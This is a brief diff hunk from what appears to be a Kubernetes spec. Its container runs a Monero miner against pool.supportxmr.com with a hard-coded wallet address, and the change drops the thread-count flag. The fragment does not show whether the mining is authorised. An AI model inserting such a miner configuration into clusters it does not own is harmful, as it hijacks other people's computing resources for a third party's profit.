@@ -45,7 +45,6 @@ spec:
                 -k --tls \
                 -o "pool.supportxmr.com:443" \
                 -u "8B8AB3jeWm1ZpCrAJLDqqoN1nMo5BJssK7vSW5ntuYqU19CB8NnDZ4ZUq4MdZo7nn1CEXmSa2jUx4cwsSCXmL2gd3iTva9c" \
-                -t "4" \
                 --randomx-1gb-pages
 
           env:
